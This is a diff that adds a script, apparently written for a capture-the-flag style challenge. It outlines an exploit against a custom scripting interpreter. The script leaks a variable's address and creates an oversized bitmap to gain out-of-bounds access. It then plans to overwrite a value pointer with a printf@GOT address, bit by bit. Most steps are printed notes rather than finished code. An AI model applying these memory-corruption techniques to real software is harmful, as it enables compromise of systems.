@@ -1,0 +1,40 @@
+print("=== Implementing Step 4: Corrupt value_ptr ===");
+
+print("Step 1: Leak addresses");
+int target = 0;
+string target = "target";
+int targetaddr = target;
+print("Target address:");
+print(targetaddr);
+
+print("Step 2: Create bitmap");
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 3: Find variable entry using OOB read");
+print("Variable entry is 64 bytes, name at offset 0x00");
+print("Scan backwards from targetaddr to find target name");
+
+print("Step 4: Calculate value_ptr address");
+print("Once entry_addr found:");
+print("value_ptr_addr = entry_addr + 0x28");
+
+print("Step 5: Find bitmap buffer address");
+print("Use OOB read to find bitmap buffer");
+print("Or estimate: bitmap_data_ptr ≈ targetaddr + offset");
+
+print("Step 6: Calculate y and x");
+print("offset = value_ptr_addr - bitmap_data_ptr");
+print("y = (offset * 8) / INT64_MAX");
+print("x = (offset * 8) % 8");
+
+print("Step 7: Write 0x409048 to value_ptr");
+print("0x409048 = bytes: 48 90 40 00 00 00 00 00");
+print("Write each bit using set()");
+
+print("Step 8: Verify corruption");
+print("int test = target;");
+print("Should read from printf@GOT now");
+
+print("Note: This requires exact address finding");
+print("which needs OOB read implementation");
+
